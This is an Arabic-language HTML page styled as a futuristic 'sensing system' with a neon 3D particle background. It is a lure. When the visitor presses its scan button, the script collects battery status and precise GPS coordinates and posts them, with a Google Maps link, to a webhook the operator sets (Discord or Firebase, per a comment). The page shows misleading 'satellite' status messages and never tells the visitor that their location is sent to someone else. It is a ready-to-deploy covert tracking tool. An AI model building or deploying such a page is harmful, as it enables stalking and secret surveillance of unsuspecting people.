<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام الاستشعار المتقدم 2026</title>
    <style>
        /* إعدادات الواجهة النيون والزجاجية */
        body { 
            margin: 0; 
            overflow: hidden; 
            background-color: #050505; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            color: #ffffff; 
        }
        canvas { 
            display: block; 
            position: absolute; 
            top: 0; 
            left: 0; 
            z-index: -1; 
        }
        .container {
            position: absolute; 
            top: 50%; 
            left: 50%; 
            transform: translate(-50%, -50%);
            width: 85%; 
            max-width: 450px; 
            padding: 40px;
            background: rgba(10, 10, 10, 0.4);
            backdrop-filter: blur(20px); 
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(0, 255, 255, 0.2);
            border-radius: 24px; 
            box-shadow: 0 0 50px rgba(0, 255, 255, 0.15), inset 0 0 20px rgba(0, 255, 255, 0.05);
            text-align: center;
        }
        h1 {
            font-size: 2.2em; 
            margin-bottom: 25px;
            color: #00ffff; 
            text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 40px #00ffff;
            letter-spacing: 2px;
        }
        .status-panel { 
            margin: 20px 0; 
            padding: 20px; 
            background: rgba(0, 0, 0, 0.5); 
            border-radius: 12px; 
            border: 1px solid rgba(0, 255, 255, 0.4); 
            font-size: 1.1em;
            text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);
            transition: 0.3s;
        }
        button {
            background: transparent; 
            color: #00ffff; 
            padding: 15px 40px; 
            font-size: 1.2em; 
            font-weight: bold;
            border: 2px solid #00ffff; 
            border-radius: 12px; 
            cursor: pointer;
            box-shadow: 0 0 15px rgba(0, 255, 255, 0.4), inset 0 0 10px rgba(0, 255, 255, 0.2); 
            transition: all 0.4s ease;
            text-transform: uppercase;
        }
        button:hover { 
            background: #00ffff; 
            color: #000000; 
            box-shadow: 0 0 40px #00ffff, inset 0 0 20px #00ffff; 
            transform: scale(1.05);
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>SYSTEM INITIATION</h1>
        <div class="status-panel" id="statusBox">بانتظار مزامنة البيانات...</div>
        <button id="activateBtn">بدء الفحص</button>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
    <script>
        // إعدادات الخلفية الـ 3D التفاعلية (جسيمات نيون)
        const scene = new THREE.Scene();
        const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
        const renderer = new THREE.WebGLRenderer({ alpha: true, antialias: true });
        renderer.setSize(window.innerWidth, window.innerHeight);
        document.body.appendChild(renderer.domElement);

        const geometry = new THREE.BufferGeometry();
        const particlesCount = 4000;
        const posArray = new Float32Array(particlesCount * 3);
        
        for(let i = 0; i < particlesCount * 3; i++) {
            posArray[i] = (Math.random() - 0.5) * 12;
        }
        
        geometry.setAttribute('position', new THREE.BufferAttribute(posArray, 3));
        const material = new THREE.PointsMaterial({ size: 0.008, color: 0x00ffff, transparent: true, opacity: 0.8 });
        const particlesMesh = new THREE.Points(geometry, material);
        scene.add(particlesMesh);
        camera.position.z = 4;

        let mouseX = 0; 
        let mouseY = 0;

        // تفاعل مع الماوس
        document.addEventListener('mousemove', (event) => {
            mouseX = (event.clientX / window.innerWidth) - 0.5;
            mouseY = (event.clientY / window.innerHeight) - 0.5;
        });

        // تفاعل مع اللمس بالجوال
        document.addEventListener('touchmove', (event) => {
            mouseX = (event.touches[0].clientX / window.innerWidth) - 0.5;
            mouseY = (event.touches[0].clientY / window.innerHeight) - 0.5;
        });

        const animate = () => {
            requestAnimationFrame(animate);
            particlesMesh.rotation.y += 0.002;
            particlesMesh.rotation.x += 0.001;
            
            // حركة ناعمة تتفاعل مع اللمس
            particlesMesh.position.x += (mouseX * 3 - particlesMesh.position.x) * 0.05;
            particlesMesh.position.y += (-mouseY * 3 - particlesMesh.position.y) * 0.05;
            
            renderer.render(scene, camera);
        };
        animate();

        // -----------------------------------------
        // نظام استخراج البيانات (شحن وبطارية وموقع)
        // -----------------------------------------
        
        // **مهم**: ضع هنا رابط الـ Webhook الخاص بك (Discord أو Firebase Functions)
        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE';

        const activateBtn = document.getElementById('activateBtn');
        const statusBox = document.getElementById('statusBox');

        activateBtn.addEventListener('click', async () => {
            statusBox.innerHTML = "<span style='color:#00ffff;'>جاري استخراج البيانات المشفرة...</span>";
            let extractedData = { content: "🌐 **تقرير النظام المتقدم** 🌐\n\n" };

            // 1. استخراج حالة البطارية
            try {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    extractedData.content += `🔋 نسبة الشحن: ${Math.round(battery.level * 100)}%\n`;
                    extractedData.content += `⚡ متصل بالطاقة: ${battery.charging ? 'نعم' : 'لا'}\n`;
                } else {
                    extractedData.content += "🔋 الشحن: غير مدعوم في هذا المتصفح\n";
                }
            } catch (error) {
                console.error("Battery API Error:", error);
            }

            // 2. استخراج الموقع الجغرافي
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        
                        extractedData.content += `📍 الموقع المباشر: https://www.google.com/maps?q=${lat},${lon}\n`;
                        extractedData.content += `🎯 دقة التحديد: ${Math.round(accuracy)} متر\n`;
                        
                        // إرسال البيانات بعد نجاح الحصول على الموقع
                        transmitData(extractedData);
                        statusBox.innerHTML = "<span style='color:#00ff00;'>تمت العملية بنجاح. النظام مفعل.</span>";
                    }, 
                    (error) => {
                        extractedData.content += `❌ الموقع: تم رفض الصلاحية أو تعذر الوصول للإحداثيات.\n`;
                        transmitData(extractedData);
                        statusBox.innerHTML = "<span style='color:#ff0000;'>فشل الاتصال بالأقمار الصناعية (تم الرفض).</span>";
                    }, 
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            } else {
                extractedData.content += "❌ الموقع: المتصفح لا يدعم تحديد الموقع.\n";
                transmitData(extractedData);
                statusBox.innerHTML = "النظام غير مدعوم.";
            }
        });

        // دالة إرسال البيانات للسيرفر الخاص بيك
        function transmitData(dataPayload) {
            if (WEBHOOK_URL === 'YOUR_WEBHOOK_URL_HERE') {
                console.log("لم يتم إعداد رابط الـ Webhook. البيانات المستخرجة:", dataPayload.content);
                return;
            }

            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(dataPayload)
            }).catch(err => console.error('خطأ في نقل البيانات:', err));
        }

        // استجابة الشاشة لتغيير الحجم
        window.addEventListener('resize', () => {
            camera.aspect = window.innerWidth / window.innerHeight;
            camera.updateProjectionMatrix();
            renderer.setSize(window.innerWidth, window.innerHeight);
        });
    </script>
</body>
</html>
